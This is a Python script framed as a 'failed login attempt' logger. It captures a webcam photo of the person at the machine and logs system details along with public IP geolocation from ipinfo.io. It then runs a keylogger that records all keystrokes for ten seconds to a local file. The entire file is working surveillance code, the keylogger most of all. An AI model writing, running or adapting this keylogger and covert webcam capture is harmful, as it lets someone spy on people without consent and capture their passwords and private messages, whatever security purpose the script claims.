import cv2
import socket
import platform
import requests
import datetime
import os
import time
from pynput import keyboard

def capture_image():
    """Capture image from webcam and save it"""
    # Ensure pictures directory exists
    os.makedirs('pictures', exist_ok=True)
    
    # Initialize webcam
    cam = cv2.VideoCapture(0)
    
    # Check if webcam is opened correctly
    if not cam.isOpened():
        print("Error: Could not open webcam")
        return False
    
    # Capture frame
    ret, frame = cam.read()
    
    if ret:
        # Generate filename with timestamp
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"pictures/capture_{timestamp}.jpg"
        
        # Save image
        cv2.imwrite(filename, frame)
        print(f"Image saved as {filename}")
    else:
        print("Error: Could not capture image")
    
    # Release webcam
    cam.release()
    return ret

def log_system_info():
    """Log system information and IP details"""
    # Ensure logs directory exists
    os.makedirs('logs', exist_ok=True)
    
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Get system details
    system_info = {
        "OS": platform.platform(),
        "System": platform.system(),
        "Node": platform.node(),
        "Release": platform.release(),
        "Version": platform.version(),
        "Machine": platform.machine(),
        "Processor": platform.processor(),
        "Python Version": platform.python_version(),
        "Timestamp": timestamp
    }
    
    # Get IP information
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        
        # Get public IP and location (optional)
        try:
            ip_response = requests.get('https://ipinfo.io/json')
            if ip_response.status_code == 200:
                ip_data = ip_response.json()
                ip_info = {
                    "Public IP": ip_data.get('ip', 'Unknown'),
                    "City": ip_data.get('city', 'Unknown'),
                    "Region": ip_data.get('region', 'Unknown'),
                    "Country": ip_data.get('country', 'Unknown'),
                    "Location": ip_data.get('loc', 'Unknown'),
                    "ISP": ip_data.get('org', 'Unknown')
                }
            else:
                ip_info = {"Error": "Could not retrieve IP information"}
        except:
            ip_info = {"Error": "Failed to connect to IP information service"}
            
    except:
        hostname = "Unknown"
        local_ip = "Unknown"
        ip_info = {"Error": "Could not retrieve network information"}
    
    # Write log
    log_filename = f"logs/log_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    
    with open(log_filename, 'w') as f:
        f.write("=== FAILED LOGIN ATTEMPT LOG ===\n\n")
        f.write(f"Timestamp: {timestamp}\n")
        f.write(f"Hostname: {hostname}\n")
        f.write(f"Local IP: {local_ip}\n\n")
        
        f.write("=== IP INFORMATION ===\n")
        for key, value in ip_info.items():
            f.write(f"{key}: {value}\n")
        f.write("\n")
        
        f.write("=== SYSTEM INFORMATION ===\n")
        for key, value in system_info.items():
            f.write(f"{key}: {value}\n")
    
    print(f"System information logged to {log_filename}")
    return log_filename

def keylogger(duration=10):
    """Log keyboard input for a specified duration (in seconds)"""
    print(f"Starting keylogger for {duration} seconds...")
    
    # Ensure logs directory exists
    os.makedirs('logs', exist_ok=True)
    
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    keylog_filename = f"logs/keylog_{timestamp}.txt"
    
    # List to store key presses
    key_logs = []
    
    # Track start time
    start_time = time.time()
    
    # Define the key press event handler
    def on_press(key):
        try:
            # Try to get the character
            key_logs.append(f"Key pressed: {key.char}")
        except AttributeError:
            # Special key
            key_logs.append(f"Special key pressed: {key}")
        
        # Stop logging if duration exceeded
        if time.time() - start_time >= duration:
            return False
    
    # Start the listener
    with keyboard.Listener(on_press=on_press) as listener:
        # Run until duration elapsed or listener stopped
        listener.join(timeout=duration)
    
    # Write key logs to file
    with open(keylog_filename, 'w') as f:
        f.write(f"=== KEYLOGGER OUTPUT ===\n")
        f.write(f"Timestamp: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"Duration: {duration} seconds\n\n")
        
        if key_logs:
            for entry in key_logs:
                f.write(f"{entry}\n")
        else:
            f.write("No keys were pressed during the logging period.\n")
    
    print(f"Key logging completed. Output saved to {keylog_filename}")
    return keylog_filename

if __name__ == "__main__":
    print("Logging failed login attempt...")
    capture_image()
    log_file = log_system_info()
    keylog_file = keylogger(10)  # Log keys for 10 seconds
    print("Logging complete")